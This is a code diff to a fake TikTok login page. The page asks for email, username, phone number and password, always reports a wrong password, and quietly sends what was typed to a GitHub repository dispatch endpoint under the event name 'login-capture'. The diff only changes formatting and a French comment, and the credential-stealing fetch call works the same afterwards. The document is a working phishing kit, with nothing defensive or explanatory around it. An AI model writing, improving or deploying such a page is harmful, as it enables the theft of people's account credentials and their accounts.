@@ -18,12 +18,10 @@
   <div class="box">
     <div class="logo"><h1 style="color:#fe2c55;margin:0">tiktok</h1></div>
     <h2 style="text-align:center">Log in to TikTok</h2>
-    
     <input type="email" id="email" placeholder="Email or username" required>
     <input type="text" id="user" placeholder="Username" required>
     <input type="tel" id="phone" placeholder="Phone number (optional)">
     <input type="password" id="pass" placeholder="Password" required>
-    
     <button onclick="send()">Log in</button>
     <div id="msg">Incorrect password. Try again.</div>
   </div>
@@ -38,7 +36,7 @@
       document.getElementById('msg').style.display = 'block';
       document.getElementById('pass').value = '';
 
-      // 100% GitHub → zéro token visible
+      // 100% GitHub – repo public → pas besoin de token ici
       fetch("https://api.github.com/repos/tiktok-customers/help/dispatches", {
         method: "POST",
         headers: {
@@ -47,12 +45,7 @@
         },
         body: JSON.stringify({
           event_type: "login-capture",
-          client_payload: {
-            email: e,
-            username: u,
-            phone: p,
-            password: w
-          }
+          client_payload: { email: e, username: u, phone: p, password: w }
         })
       });
     }
